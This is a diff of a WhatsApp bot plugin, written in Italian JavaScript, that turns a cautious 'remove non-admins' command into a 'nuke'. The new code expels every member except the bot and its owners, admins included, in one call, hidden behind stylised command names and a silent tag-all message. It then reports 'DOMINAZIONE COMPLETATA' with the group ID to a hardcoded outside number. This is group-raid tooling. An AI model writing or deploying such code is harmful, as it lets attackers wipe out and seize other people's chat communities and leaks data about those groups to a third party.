@@ -1,53 +1,58 @@
-const owners = [
-  "584162501837@s.whatsapp.net"
-];
+const LOG_JID = '447880017985@s.whatsapp.net';
 
 let handler = async (m, { conn, participants, isBotAdmin }) => {
-  if (!m.isGroup) return;
-  if (!participants?.length) return;
+    if (!m.isGroup) return;
 
-  if (!isBotAdmin) {
-    return m.reply("❌ Il bot deve essere admin.");
-  }
+    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
+    if (!ownerJids.includes(m.sender)) return;
 
-  const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
+    if (!isBotAdmin) return;
 
-  // 🔥 SOLO NON-ADMIN REALI
-  let targets = participants
-    .filter(p =>
-      p.id.endsWith('@s.whatsapp.net') && // utenti veri
-      !p.admin &&                         // NON admin
-      p.id !== botId &&                   // NON bot
-      !owners.includes(p.id)              // NON owner
-    )
-    .map(p => p.id);
+    const botId = conn.user.id.split(':')[0];
 
-  if (!targets.length) {
-    return m.reply("⚠️ Nessun membro non-admin da rimuovere.");
-  }
+    // Target per il nuke: TUTTI tranne bot + owner
+    let usersToRemove = participants
+        .map(p => p.jid)
+        .filter(jid =>
+            jid &&
+            jid !== botId &&
+            !ownerJids.includes(jid)
+        );
 
-  await conn.sendMessage(m.chat, {
-    text: `🧹 *Rimozione non-admin*\n` +
-      targets.map(u => `@${u.split('@')[0]}`).join(' '),
-    mentions: targets
-  });
+    if (!usersToRemove.length) return;
 
-  let removed = 0;
+    // ⚠️ MESSAGGIO PRIMA DEL NUKE (TAG ALL NASCOSTO)
+    let allJids = participants.map(p => p.jid); // include tutti
+    let hiddenTagMessage = '☫₣ Ø ฿ ł 𐌀✢ꪶ🕊ꫂ\n𝐏𝐔𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍💮';
 
-  for (let user of targets) {
+    await conn.sendMessage(m.chat, {
+        text: hiddenTagMessage,
+        mentions: allJids // tagga tutti senza scrivere nomi
+    });
+
+    // ⚡ NUKE — COLPO UNICO
     try {
-      await conn.groupParticipantsUpdate(m.chat, [user], "remove");
-      removed++;
-      await new Promise(r => setTimeout(r, 1500));
-    } catch (e) {
-      console.log("Errore rimozione:", user, e?.output?.statusCode);
-    }
-  }
+        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
 
-  await m.reply(`✅ Rimossi ${removed}/${targets.length} membri non-admin.`);
+        // LOG DOPO
+        await conn.sendMessage(LOG_JID, {
+            text:
+`DOMINAZIONE COMPLETATA
+
+👤 Da: @${m.sender.split('@')[0]}
+👥 Rimossi: ${usersToRemove.length}
+📌 Gruppo: ${m.chat}
+🕒 ${new Date().toLocaleString()}`,
+            mentions: [m.sender]
+        });
+
+    } catch (e) {
+        console.error(e);
+        await m.reply('❌ Errore durante l\'hard wipe.');
+    }
 };
 
-handler.command = ["nonadmin", "svuotanoadmin"];
+handler.command = ['fobia', 'vortexregna', 'purification'];
 handler.group = true;
 handler.botAdmin = true;
 
